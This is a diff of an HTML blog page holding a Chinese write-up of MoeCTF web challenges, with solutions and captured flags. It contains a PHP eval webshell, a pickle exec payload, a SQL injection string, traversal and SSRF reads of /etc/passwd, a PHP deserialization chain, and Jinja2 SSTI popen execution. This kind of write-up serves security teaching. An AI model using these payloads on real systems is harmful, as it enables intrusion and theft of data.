@@ -12,8 +12,8 @@
 <title>WEB - Darstib's blog!</title>
 <link href="../../../assets/stylesheets/main.8608ea7d.min.css" rel="stylesheet"/>
 <link href="../../../assets/stylesheets/palette.06af60db.min.css" rel="stylesheet"/>
-<link href="../../../css/heti.css" rel="stylesheet"/>
 <link href="../../../css/timeline.css" rel="stylesheet"/>
+<link href="../../../css/heti.css" rel="stylesheet"/>
 <link href="../../../css/custom.css" rel="stylesheet"/>
 <link href="../../../css/neoteroi-mkdocs.css" rel="stylesheet"/>
 <link href="../../../css/katex.min.css" rel="stylesheet"/>
@@ -24,8 +24,6 @@
 <link href="https://gcore.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css" rel="stylesheet"/>
 <link href="https://gcore.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.1.0/style.css" rel="stylesheet"/>
 <link href="https://gcore.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css" rel="stylesheet"/>
-<link href="../../../assets/stylesheets/obsidian.min.css" rel="stylesheet"/>
-<link href="../../../assets/stylesheets/obsidian.min.css.map" rel="stylesheet"/>
 <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
 <script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-XXXXXXXXXX"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-XXXXXXXXXX",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
 <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
@@ -857,8 +855,8 @@
 <a href="#__codelineno-0-11" id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="c1"># gASVUwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw3aW1wb3J0IG9zOyBzdG9yZS5jcmVhdGVfcGV0KG9zLmdldGVudignRkxBRycpLCAnZmxhZycpO5SFlFKULg==</span>
 </code></pre></div>
 <p>将其在 “Import a Pet” 中导入后，可以在 “current Pet” 中看到<span><span class="heti-spacing"> </span>flag</span></p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{5t4rRYmEOW' s_fLAG-H4s_b33n_ACCEPted-Ac4c@c @Ca}</p>
 </div>
 <h3 id="_1">垫刀之路<a class="headerlink" href="#_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
@@ -870,28 +868,28 @@
 <li><strong><span>env<span class="heti-spacing"> </span></span>命令</strong><span><span class="heti-spacing"> </span></span>用于显示系统中已存在的环境变量，以及在定义的环境中执行指令；</li>
 <li><strong><span>set<span class="heti-spacing"> </span></span>命令</strong><span><span class="heti-spacing"> </span></span>作用主要是显示系统中已经存在的<span class="heti-skip"><span class="heti-spacing"> </span>shell<span class="heti-spacing"> </span></span>变量。</li>
 </ul>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{WELCOM3_TO_MoeCtf_aNd_RoaDI_5tArTUp-bY-SxRHHH69}</p>
 </div>
 <h4 id="02"><span>02<span class="heti-spacing"> </span></span>普通的文件上传<a class="headerlink" href="#02" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h4>
 <p><a href="https://xz.aliyun.com/t/6957">浅谈<span class="heti-skip"><span class="heti-spacing"> </span>php<span class="heti-spacing"> </span></span>一句话木马</a></p>
 <p>完全没有过滤，那很简单，直接上传包含一句话木马 <code>&lt;?php @eval ($_POST['1']);</code> 的<span class="heti-skip"><span class="heti-spacing"> </span>1.php<span class="heti-spacing"> </span></span>文件，并使用中国蚁剑连接。</p>
 <p>当然，参考于第一题<span class="heti-skip"><span class="heti-spacing"> </span>flag<span class="heti-spacing"> </span></span>在环境变量中，我们直接以<span class="heti-skip"><span class="heti-spacing"> </span>POST<span class="heti-spacing"> </span></span>的形式提交 <code>1=phpinfo();</code>  就可以将其输出，之后 <code>ctrl+f</code> 查找即可。</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{wo_wang_ji_le}</p>
 </div>
 <h4 id="03"><span>03<span class="heti-spacing"> </span></span>这是一个图床<a class="headerlink" href="#03" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h4>
 <p>抓包绕过。</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{bYP@S5-tHE_MImE_tyPE_@nd-ExTen5i0N-y0u_C@N-Do-It2}</p>
 </div>
 <h4 id="04"><span>04<span class="heti-spacing"> </span></span>一个文件浏览器<a class="headerlink" href="#04" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h4>
-<p>允许根据路径获取文件（夹<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，直接<a href="../attachments/WEB-11.png">目录穿透到根目录下</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">31d9f3fab5015db519a9eb6663402d1b</strong>，在<span class="heti-skip"><span class="heti-spacing"> </span>tmp/flag<span class="heti-spacing"> </span></span>下找到：}</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<p>允许根据路径获取文件（夹<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，直接<a href="../attachments/WEB-11.png">目录穿透到根目录下</a>，在<span class="heti-skip"><span class="heti-spacing"> </span>tmp/flag<span class="heti-spacing"> </span></span>下找到：</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{Cr0sS-THe_D1RECtory_AnD_yoU_MaY_fIND_eTc-PaSSWD13}</p>
 </div>
 <h4 id="05"><span>05<span class="heti-spacing"> </span></span>登陆网站<a class="headerlink" href="#05" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h4>
@@ -915,9 +913,9 @@
 <a href="#__codelineno-1-17" id="__codelineno-1-17" name="__codelineno-1-17"></a><span class="w">    </span><span class="p">}</span>
 <a href="#__codelineno-1-18" id="__codelineno-1-18" name="__codelineno-1-18"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
-<p>可以看到是以<span class="heti-skip"><span class="heti-spacing"> </span>post<span class="heti-spacing"> </span></span>的形式<span class="heti-skip"><span class="heti-spacing"> </span>login.php<span class="heti-spacing"> </span></span>的网址发送了请求，所以我们将<span class="heti-skip"><span class="heti-spacing"> </span>url<span class="heti-spacing"> </span></span>改为 <code>localhost:port/login.php</code> ，然后以<span class="heti-skip"><span class="heti-spacing"> </span>post<span class="heti-spacing"> </span></span>请求发送，和<span class="heti-skip"><span class="heti-spacing"> </span>sql<span class="heti-spacing"> </span></span>一样的<a href="../attachments/WEB.png">注入即可</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">772c0adfe38e9444fc7bcf85689b951a</strong>。}</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<p>可以看到是以<span class="heti-skip"><span class="heti-spacing"> </span>post<span class="heti-spacing"> </span></span>的形式<span class="heti-skip"><span class="heti-spacing"> </span>login.php<span class="heti-spacing"> </span></span>的网址发送了请求，所以我们将<span class="heti-skip"><span class="heti-spacing"> </span>url<span class="heti-spacing"> </span></span>改为 <code>localhost:port/login.php</code> ，然后以<span class="heti-skip"><span class="heti-spacing"> </span>post<span class="heti-spacing"> </span></span>请求发送，和<span class="heti-skip"><span class="heti-spacing"> </span>sql<span class="heti-spacing"> </span></span>一样的<a href="../attachments/WEB.png">注入即可</a>。</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{Hav3_tHe-U5EFu1_pA5swOrd_ANd_GO-EV3ryWHEre-onIY-5ql_can_do0}</p>
 </div>
 <h4 id="06-pop-base-mini-moe">06 pop base mini moe<a class="headerlink" href="#06-pop-base-mini-moe" title="Permanent link">¶</a></h4>
@@ -989,22 +987,22 @@
 <p>需要注意其中<span class="heti-skip"><span class="heti-spacing"> </span>private<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>protected<span class="heti-spacing"> </span></span>类型的变量的字符串字符数不对，同时分析可知 <code>A evil</code> <code>A a</code> <code>B b</code> 之间应该有不可见字符，我们使用 <code>%00</code> 进行填充：</p>
 <p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="../attachments/WEB-13.png"><img alt="" src="../attachments/WEB-13.png"/></a></p>
 <p>可以看见有<span><span class="heti-spacing"> </span>flag</span>，修改<code>s:4:"ls /";</code><span><span class="heti-spacing"> </span>=&gt;</span> <code>s:9:"cat /flag";</code> （当然也可能是个文件夹，用 <code>s:8:"ls /flag";</code>）</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{PlEA53_Klck-CFbb_beCAu53_hE_R41S3_p0PMoE-ln_W3ek1_haha0}</p>
 </div>
 <h4 id="07"><span>07<span class="heti-spacing"> </span></span>泄漏的密码<a class="headerlink" href="#07" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h4>
 <p><a href="https://b33pl0g1c.medium.com/hacking-the-debugging-pin-of-a-flask-application-7364794c4948">Hacking the Debugging Pin of a Flask Application</a></p>
-<p>阅读上面的文章（在本题我们只需要看开头的部分即可<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，了解到<span class="heti-skip"><span class="heti-spacing"> </span>console<span class="heti-spacing"> </span></span>这个控制台，又有了<span class="heti-skip"><span class="heti-spacing"> </span>pin<span class="heti-spacing"> </span></span>码，那就直接登进去，<a href="../attachments/WEB-15.png"><span>python<span class="heti-spacing"> </span></span>任意代码执行</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">96ba37b620d208d160b24c39afc62622</strong>了。}</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<p>阅读上面的文章（在本题我们只需要看开头的部分即可<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，了解到<span class="heti-skip"><span class="heti-spacing"> </span>console<span class="heti-spacing"> </span></span>这个控制台，又有了<span class="heti-skip"><span class="heti-spacing"> </span>pin<span class="heti-spacing"> </span></span>码，那就直接登进去，<a href="../attachments/WEB-15.png"><span>python<span class="heti-spacing"> </span></span>任意代码执行</a>了。</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{DONt-u5iNG_FLASK-by_D3buG-MOd_AnD_Ie@k-YOUr_Pln7}</p>
 </div>
 <h3 id="_backend">电院<span><span class="heti-spacing"> </span>_Backend</span><a class="headerlink" href="#_backend" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
-<p>根据<span class="heti-skip"><span class="heti-spacing"> </span>login.php<span class="heti-spacing"> </span></span>源码，可以看出来是要登入，且是<span class="heti-skip"><span class="heti-spacing"> </span>SQL<span class="heti-spacing"> </span></span>注入（因为<span class="heti-skip"><span class="heti-spacing"> </span>Email<span class="heti-spacing"> </span></span>的正则表达式检查很简单<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，<code>aaa@bbb.com'%201=1%20#</code> <a href="../attachments/WEB-22.png">作为邮箱即可</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">66eab4e2087101d9bb9e64e8df5802a2</strong>；}</p>
+<p>根据<span class="heti-skip"><span class="heti-spacing"> </span>login.php<span class="heti-spacing"> </span></span>源码，可以看出来是要登入，且是<span class="heti-skip"><span class="heti-spacing"> </span>SQL<span class="heti-spacing"> </span></span>注入（因为<span class="heti-skip"><span class="heti-spacing"> </span>Email<span class="heti-spacing"> </span></span>的正则表达式检查很简单<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，<code>aaa@bbb.com'%201=1%20#</code> <a href="../attachments/WEB-22.png">作为邮箱即可</a>；</p>
 <p>登入界面呢？看源码没有，看<span class="heti-skip"><span class="heti-spacing"> </span>robots.txt<span class="heti-spacing"> </span></span>就好了：</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{l_dld_nOt_ExPect-y0U-tO-B3_sO-STr0Ng1e402}</p>
 </div>
 <h3 id="pop-moe">pop moe<a class="headerlink" href="#pop-moe" title="Permanent link">¶</a></h3>
@@ -1049,9 +1047,9 @@
 <a href="#__codelineno-4-38" id="__codelineno-4-38" name="__codelineno-4-38"></a><span class="nv">$serializedString</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj0</span><span class="p">);</span> <span class="c1">// 序列化class000对象  </span>
 <a href="#__codelineno-4-39" id="__codelineno-4-39" name="__codelineno-4-39"></a><span class="k">echo</span> <span class="nv">$serializedString</span><span class="p">;</span>
 </code></pre></div>
-<p>同样需要添加 <code>%00</code> ，<a href="../attachments/WEB-14.png">进入<span class="heti-skip"><span class="heti-spacing"> </span>phpinfo<span class="heti-spacing"> </span></span>界面后搜<span><span class="heti-spacing"> </span>moectf</span></a><span><span class="heti-spacing"> </span>{</span><strong class="hash">64681067867d450b411023993b797395</strong>}</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<p>同样需要添加 <code>%00</code> ，<a href="../attachments/WEB-14.png">进入<span class="heti-skip"><span class="heti-spacing"> </span>phpinfo<span class="heti-spacing"> </span></span>界面后搜<span><span class="heti-spacing"> </span>moectf</span></a></p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{lT-S3eMs-tH4t-YoU_KnOw_wHAt_1s-p0p-1N-PhPppPpPP!!!26}</p>
 </div>
 <h3 id="imagecloud">ImageCloud<a class="headerlink" href="#imagecloud" title="Permanent link">¶</a></h3>
@@ -1078,15 +1076,15 @@
 <a href="#__codelineno-5-16" id="__codelineno-5-16" name="__codelineno-5-16"></a><span class="k">else</span><span class="p">:</span>
 <a href="#__codelineno-5-17" id="__codelineno-5-17" name="__codelineno-5-17"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">"未找到可成功访问的端口"</span><span class="p">)</span>
 </code></pre></div>
-<p><a href="../attachments/WEB-10.png">成功爆破</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">e3d7438f4028a4b45cc7537c582505aa</strong> <span>=&gt; http://127.0.0.1:55844/image?url=http://localhost:5381/image/flag.jpg<span class="heti-spacing"> </span></span>访问获取图片<span><span class="heti-spacing"> </span>}</span></p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<p><a href="../attachments/WEB-10.png">成功爆破</a><span class="heti-skip"><span class="heti-spacing"> </span>=&gt; http://127.0.0.1:55844/image?url=http://localhost:5381/image/flag.jpg<span class="heti-spacing"> </span></span>访问获取图片</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{cEtTeBRAT3_y0u_Att4cK_t0-my-tmAge_CtOuDhhHhhH410}</p>
 </div>
 <h3 id="imagecloud_1"><span>ImageCloud<span class="heti-spacing"> </span></span>前置<a class="headerlink" href="#imagecloud_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
-<p><code>?url=</code> 文件读取<span><span class="heti-spacing"> </span>=&gt;</span><code>?url=file:///etc/passwd</code><span><span class="heti-spacing"> </span>=&gt;</span><a href="../attachments/WEB-9.png"><span><span class="heti-spacing"> </span>flag</span></a><span><span class="heti-spacing"> </span>{</span><strong class="hash">66a49b00efd93f11668b050a7bee8e02</strong>}</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<p><code>?url=</code> 文件读取<span><span class="heti-spacing"> </span>=&gt;</span><code>?url=file:///etc/passwd</code><span><span class="heti-spacing"> </span>=&gt;</span><a href="../attachments/WEB-9.png"><span><span class="heti-spacing"> </span>flag</span></a></p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{I-@m-v3RY_SoRrY-abouT_tHiS42911bf8}</p>
 </div>
 <h3 id="proveyourlove">ProveYourLove<a class="headerlink" href="#proveyourlove" title="Permanent link">¶</a></h3>
@@ -1135,7 +1133,7 @@
 <a href="#__codelineno-6-42" id="__codelineno-6-42" name="__codelineno-6-42"></a>
 <a href="#__codelineno-6-43" id="__codelineno-6-43" name="__codelineno-6-43"></a><span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">submit_forms</span><span class="p">(</span><span class="mi">302</span><span class="p">))</span>
 </code></pre></div>
-<p>因为<span class="heti-skip"><span class="heti-spacing"> </span>sleep<span class="heti-spacing"> </span></span>设置的很短，很快就<a href="../attachments/WEB-8.png">有了<span><span class="heti-spacing"> </span>flag</span></a><span><span class="heti-spacing"> </span>{</span><strong class="hash">1edb9e5142f191ad857aebe3f2188666</strong>；在<span class="heti-skip"><span class="heti-spacing"> </span>console<span class="heti-spacing"> </span></span>中使用<span class="heti-skip"><span class="heti-spacing"> </span>js<span class="heti-spacing"> </span></span>脚本也是可以的：}</p>
+<p>因为<span class="heti-skip"><span class="heti-spacing"> </span>sleep<span class="heti-spacing"> </span></span>设置的很短，很快就<a href="../attachments/WEB-8.png">有了<span><span class="heti-spacing"> </span>flag</span></a>；在<span class="heti-skip"><span class="heti-spacing"> </span>console<span class="heti-spacing"> </span></span>中使用<span class="heti-skip"><span class="heti-spacing"> </span>js<span class="heti-spacing"> </span></span>脚本也是可以的：</p>
 <div class="highlight"><span class="filename">ProveYourLove.js</span><pre><span></span><code><a href="#__codelineno-7-1" id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">submitForms</span><span class="p">(</span><span class="nx">count</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <a href="#__codelineno-7-2" id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">count</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <a href="#__codelineno-7-3" id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="w">        </span><span class="c1">// 重置localStorage</span>
@@ -1190,28 +1188,24 @@
 <a href="#__codelineno-7-52" id="__codelineno-7-52" name="__codelineno-7-52"></a><span class="c1">// 执行302次提交</span>
 <a href="#__codelineno-7-53" id="__codelineno-7-53" name="__codelineno-7-53"></a><span class="nx">submitForms</span><span class="p">(</span><span class="mf">302</span><span class="p">);</span>
 </code></pre></div>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p><code>moectf{COngrATU1AtI0nS_0N-b3ComlnG_@_IlCKING_D0Gb}</code></p>
 </div>
 <h3 id="whos-blog">who's blog?<a class="headerlink" href="#whos-blog" title="Permanent link">¶</a></h3>
 <p>提示我们提供 <code>id</code> 使用 <code>$_GET</code> 进行传参，发现将我们传入的值放在了网站中。</p>
 <p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="../attachments/WEB-17.png"><img alt="" src="../attachments/WEB-17.png"/></a></p>
-<p>经过查阅，猜测为<span><span class="heti-spacing"> </span>SSTI</span> ，我们尝试 <code>?id={{}}</code> ，发现是<a href="../attachments/WEB-18.png"><span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>的<span><span class="heti-spacing"> </span>jinja2</span></a><span><span class="heti-spacing"> </span>{</span><strong class="hash">2e0fea3eada7a7b51beba116b853146b</strong> 模板（当然，搭建过<span class="heti-skip"><span class="heti-spacing"> </span>mkdocs<span class="heti-spacing"> </span></span>也会清楚其使用<span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>实现<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，故我们<span class="heti-skip"><span class="heti-spacing"> </span>}<span class="heti-spacing"> </span></span><a href="../attachments/WEB-19.png">利用<span class="heti-skip"><span class="heti-spacing"> </span>hackbar<span class="heti-spacing"> </span></span>进行注入</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">e52445fa34db80c1eb1687ba700ac82d</strong>，确实是<span class="heti-skip"><span class="heti-spacing"> </span>}<span class="heti-spacing"> </span></span><a href="../attachments/WEB-20.png">能够执行</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">019c9654abe60efa0d725b50bfce04b7</strong>，修改<span class="heti-skip"><span class="heti-spacing"> </span>}<span class="heti-spacing"> </span></span><code>popen('ls')</code>的内容就可以执行任意代码。</p>
-<p>使用<span class="heti-skip"><span class="heti-spacing"> </span>find<span class="heti-spacing"> </span></span>没找到，执行 <code>set</code> ，就发现了，或者<a href="../attachments/WEB-21.png">尝试<code>echo $PATH</code></a><span><span class="heti-spacing"> </span>{</span><strong class="hash">e411dbdf16ff35e3064ace379fe936d1</strong> （当然前者优先，后者是已经知道位置后的选择）}</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<p>经过查阅，猜测为<span><span class="heti-spacing"> </span>SSTI</span> ，我们尝试 <code>?id={{}}</code> ，发现是<a href="../attachments/WEB-18.png"><span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>jinja2<span class="heti-spacing"> </span></span></a>模板（当然，搭建过<span class="heti-skip"><span class="heti-spacing"> </span>mkdocs<span class="heti-spacing"> </span></span>也会清楚其使用<span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>实现<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，故我们<a href="../attachments/WEB-19.png">利用<span class="heti-skip"><span class="heti-spacing"> </span>hackbar<span class="heti-spacing"> </span></span>进行注入</a>，确实是 <a href="../attachments/WEB-20.png">能够执行</a>，修改 <code>popen('ls')</code> 的内容就可以执行任意代码。</p>
+<p>使用<span class="heti-skip"><span class="heti-spacing"> </span>find<span class="heti-spacing"> </span></span>没找到，执行 <code>set</code> ，就发现了，或者<a href="../attachments/WEB-21.png">尝试 <code>echo $PATH</code></a> （当然前者优先，后者是已经知道位置后的选择）</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{DO-yoU-kn0W-SsTI_aND_PLe4sE_v1slt-sXRHHh5-B10G2} </p>
 </div>
 <div class="admonition note">
 <p class="admonition-title">Note</p>
 <ul>
-<li>
-<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">一篇文章带你理解漏洞之<span class="heti-skip"><span class="heti-spacing"> </span>SSTI<span class="heti-spacing"> </span></span>漏洞</a></p>
-</li>
-<li>
-<p><a href="https://devv.ai/search?threadId=dzj766lpwbnk"><span>MVC<span class="heti-spacing"> </span></span>模式</a></p>
-</li>
+<li><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">一篇文章带你理解漏洞之<span class="heti-skip"><span class="heti-spacing"> </span>SSTI<span class="heti-spacing"> </span></span>漏洞</a></li>
+<li><a href="https://devv.ai/search?threadId=dzj766lpwbnk"><span>MVC<span class="heti-spacing"> </span></span>模式</a></li>
 </ul>
 </div>
 <h3 id="_2">静态网页<a class="headerlink" href="#_2" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
@@ -1245,8 +1239,8 @@
 <li><span>b[0]<span class="heti-spacing"> </span></span>弱比较等于<span><span class="heti-spacing"> </span>md5(a).</span></li>
 </ul>
 <p>考虑<span class="heti-skip"><span class="heti-spacing"> </span>ctf101<span class="heti-spacing"> </span></span>上的讲的<span><span class="heti-spacing"> </span>0exxx == 0</span> ，我们不难猜到<span class="heti-skip"><span class="heti-spacing"> </span>md5(a)=0exxx<span class="heti-spacing"> </span></span>且<span class="heti-skip"><span class="heti-spacing"> </span>b=0xxx<span class="heti-spacing"> </span></span>即可；当然不是这样也无妨，毕竟<span class="heti-skip"><span class="heti-spacing"> </span>b[0]<span class="heti-spacing"> </span></span>我们完全可以自己决定。</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{I5_My_WIfE-P10_CHaN-cute-0r_Y0uR-Wif3-I5_pHP?b2}</p>
 </div>
 <h3 id="_3">勇闯铜人阵<a class="headerlink" href="#_3" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
@@ -1303,8 +1297,8 @@
 <a href="#__codelineno-9-51" id="__codelineno-9-51" name="__codelineno-9-51"></a>
 <a href="#__codelineno-9-52" id="__codelineno-9-52" name="__codelineno-9-52"></a><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 </code></pre></div>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{WELL1L_y0U_Pa5S_th3-cH@L13nGE_FRrRRROM_tOnR3N9}</p>
 </div>
 <h3 id="_4">弗拉格之地的挑战<a class="headerlink" href="#_4" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
@@ -1312,64 +1306,46 @@
 <h4 id="flag1abhtml">flag1ab.html<a class="headerlink" href="#flag1abhtml" title="Permanent link">¶</a></h4>
 <p>查看源码<span><span class="heti-spacing"> </span>=&gt;</span> <code>flag1: bW9lY3Rm</code></p>
 <h4 id="flag2hhphp">flag2hh.php<a class="headerlink" href="#flag2hhphp" title="Permanent link">¶</a></h4>
-<p><a href="../attachments/WEB-1.png">查看消息头</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">24297d320a75886ab2fcfc61d2985c4b</strong> =&gt; }<code>flag2: e0FmdEV</code></p>
+<p><a href="../attachments/WEB-1.png">查看消息头</a><span><span class="heti-spacing"> </span>=&gt;</span> <code>flag2: e0FmdEV</code></p>
 <h4 id="flag3cadphp">flag3cad.php<a class="headerlink" href="#flag3cadphp" title="Permanent link">¶</a></h4>
-<p>使用<span class="heti-skip"><span class="heti-spacing"> </span>cookie-editor + hackbar<span class="heti-spacing"> </span></span><a href="../attachments/WEB-2.png">达到要求</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">549f8f23d6fc86e375a9d82e3738b9bf</strong> =&gt; }<code>flag3: yX3RoMXN</code></p>
+<p>使用<span class="heti-skip"><span class="heti-spacing"> </span>cookie-editor + hackbar<span class="heti-spacing"> </span></span><a href="../attachments/WEB-2.png">达到要求</a><span><span class="heti-spacing"> </span>=&gt;</span> <code>flag3: yX3RoMXN</code></p>
 <h4 id="flag4bbcphp">flag4bbc.php<a class="headerlink" href="#flag4bbcphp" title="Permanent link">¶</a></h4>
-<p><span>hackbar<span class="heti-spacing"> </span></span>中<a href="../attachments/WEB-3.png">修改<span><span class="heti-spacing"> </span>Referer</span></a><span><span class="heti-spacing"> </span>{</span><strong class="hash">9e45189f6daf5623540a881d410e1397</strong> <span>=&gt;<span class="heti-spacing"> </span></span>查看源码发现<span class="heti-skip"><span class="heti-spacing"> </span>js<span class="heti-spacing"> </span></span>脚本；我们为什么要靠它帮我们发送获取<span class="heti-skip"><span class="heti-spacing"> </span>flag<span class="heti-spacing"> </span></span>的请求？<span>}<span class="heti-spacing"> </span></span><a href="../attachments/WEB-4.png">使用<span class="heti-skip"><span class="heti-spacing"> </span>hackbar<span class="heti-spacing"> </span></span>发送</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">307d679fe3a018e1f23221c64fd09cf1</strong> =&gt; }<code>flag4: fdFVUMHJ</code></p>
+<p><span>hackbar<span class="heti-spacing"> </span></span>中<a href="../attachments/WEB-3.png">修改<span class="heti-skip"><span class="heti-spacing"> </span>Referer<span class="heti-spacing"> </span></span></a><span class="heti-skip"><span class="heti-spacing"> </span>=&gt;<span class="heti-spacing"> </span></span>查看源码发现<span class="heti-skip"><span class="heti-spacing"> </span>js<span class="heti-spacing"> </span></span>脚本；我们为什么要靠它帮我们发送获取<span class="heti-skip"><span class="heti-spacing"> </span>flag<span class="heti-spacing"> </span></span>的请求？<a href="../attachments/WEB-4.png">使用<span class="heti-skip"><span class="heti-spacing"> </span>hackbar<span class="heti-spacing"> </span></span>发送</a><span><span class="heti-spacing"> </span>=&gt;</span> <code>flag4: fdFVUMHJ</code></p>
